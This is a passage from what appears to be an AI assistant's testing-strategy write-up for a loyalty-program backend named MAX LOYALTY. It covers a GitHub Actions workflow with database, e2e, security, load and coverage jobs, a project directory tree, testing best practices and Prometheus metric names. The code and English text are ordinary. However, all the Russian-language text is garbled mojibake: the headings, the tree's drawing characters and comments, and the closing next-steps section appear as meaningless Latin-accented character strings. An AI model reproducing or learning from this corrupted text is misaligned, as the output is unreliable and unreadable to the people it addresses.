          files: ./coverage/coverage-final.json
          flags: unit

  integration-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: postgres
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:7
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run Prisma migrations
        run: npx prisma migrate deploy
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test
      
      - name: Run integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test
          REDIS_HOST: localhost

  e2e-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
      
      - name: Install dependencies
        run: npm ci
      
      - name: Start application
        run: npm run start:test &
      
      - name: Wait for application
        run: npx wait-on http://localhost:3000/health
      
      - name: Run E2E tests
        run: npm run test:e2e

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run security tests
        run: npm run test:security
      
      - name: npm audit
        run: npm audit --audit-level=high
      
      - name: Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

  load-tests:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v3
      
      - name: Run load tests
        run: npm run test:load
      
      - name: Upload load test results
        uses: actions/upload-artifact@v3
        with:
          name: load-test-results
          path: load-test-results/

  coverage-report:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, e2e-tests]
    steps:
      - uses: actions/checkout@v3
      
      - name: Generate coverage report
        run: npm run test:report
      
      - name: Upload report
        uses: actions/upload-artifact@v3
        with:
          name: coverage-report
          path: reports/coverage-report.json
      
      - name: Comment PR with coverage
        uses: romeovs/lcov-reporter-action@v0.3.1
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          lcov-file: ./coverage/lcov.info
```


***

## **๐ ะคะะะะะฌะะะฏ ะกะขะะฃะะขะฃะะ ะะะะะะขะ**

```
max-loyalty/
โโโ apps/
โ   โโโ backend/
โ       โโโ src/
โ       โโโ test/
โ       โ   โโโ unit/                    # โ ะะพะฟัะพัั 1-10
โ       โ   โโโ integration/             # โ ะะพะฟัะพัั 11-20
โ       โ   โโโ e2e/                     # โ ะะพะฟัะพัั 11-15
โ       โ   โโโ contract/                # โ ะะพะฟัะพัั 16-20
โ       โ   โโโ performance/             # โ ะะพะฟัะพัั 21-30
โ       โ   โโโ security/                # โ ะะพะฟัะพัั 31-40
โ       โ   โโโ observability/           # ๐ Bonus
โ       โ   โโโ fixtures/
โ       โ   โโโ helpers/
โ       โ   โโโ setup.ts
โ       โโโ coverage/
โ       โโโ reports/
โ       โโโ jest.config.js
โโโ scripts/
โ   โโโ generate-coverage-report.ts
โ   โโโ check-schema-changes.js
โโโ .github/
โ   โโโ workflows/
โ       โโโ test.yml
โ       โโโ security.yml
โโโ package.json
```


***

## **๐ BEST PRACTICES SUMMARY**

### **1. Testing Pyramid**

- **70% Unit Tests** - Fast, isolated, ะผะฝะพะณะพ tests
- **20% Integration Tests** - Database, external services
- **10% E2E Tests** - Critical user journeys


### **2. Coverage Targets**

- **Overall**: 80%+
- **Critical Paths**: 90%+
- **Security-sensitive code**: 95%+


### **3. Test Naming Convention**

```typescript
describe('ServiceName', () => {
  describe('methodName', () => {
    it('should do something when condition', () => {
      // Arrange
      // Act
      // Assert
    });
  });
});
```


### **4. Continuous Testing**

- โ Pre-commit hooks (lint + unit tests)
- โ PR checks (all test suites)
- โ Nightly builds (load + security tests)
- โ Weekly (dependency scans)


### **5. Performance Budgets**

- API endpoints: p95 < 500ms
- Database queries: p95 < 100ms
- Cache hit rate: > 80%
- Background jobs: throughput > 100/sec


### **6. Security Checklist**

- โ No PII in logs
- โ All inputs validated
- โ Rate limiting on all endpoints
- โ Security headers set
- โ Dependencies scanned weekly
- โ Automated penetration testing

***

## **๐ METRICS DASHBOARD**

ะะตะบะพะผะตะฝะดัะตะผัะต ะผะตััะธะบะธ ะดะปั ะผะพะฝะธัะพัะธะฝะณะฐ:

```typescript
// Prometheus metrics to track
const metrics = {
  // Business metrics
  'balls_earned_total': 'Total balls earned by tenants',
  'balls_redeemed_total': 'Total balls redeemed',
  'active_guests_count': 'Number of active guests',
  'revenue_generated': 'Revenue from loyalty program',
  
  // Technical metrics
  'http_requests_total': 'Total HTTP requests',
  'http_request_duration_seconds': 'HTTP request latency',
  'db_query_duration_seconds': 'Database query latency',
  'cache_hit_rate': 'Redis cache hit rate',
  'queue_job_duration_seconds': 'Background job processing time',
  'queue_job_failures_total': 'Failed background jobs',
  
  // Security metrics
  'auth_failures_total': 'Failed authentication attempts',
  'rate_limit_exceeded_total': 'Rate limit violations',
  'suspicious_activity_total': 'Potential security threats',
};
```


***

๐ **ะะะะะะะะะฏะฎ! ะฃ ัะตะฑั ัะตะฟะตัั ะตััั comprehensive testing strategy ะดะปั MAX LOYALTY!**

**ะกะปะตะดัััะธะต ัะฐะณะธ:**

1. Implement tests ะฟะพััะตะฟะตะฝะฝะพ (ะฝะฐัะฝะธ ั critical paths)
2. ะะฐัััะพะน CI/CD pipeline
3. ะะฐะฟัััะธ ะฟะตัะฒัะน coverage report
4. Iterate ะฝะฐ ะพัะฝะพะฒะต ัะตะทัะปััะฐัะพะฒ

**ะัะถะฝะฐ ะฟะพะผะพัั ั:**

- ะะพะฝะบัะตัะฝะพะน ะธะผะฟะปะตะผะตะฝัะฐัะธะตะน ะบะฐะบะพะณะพ-ัะพ ัะตััะฐ?
- ะะฐัััะพะนะบะพะน CI/CD?
- Debugging failing tests?

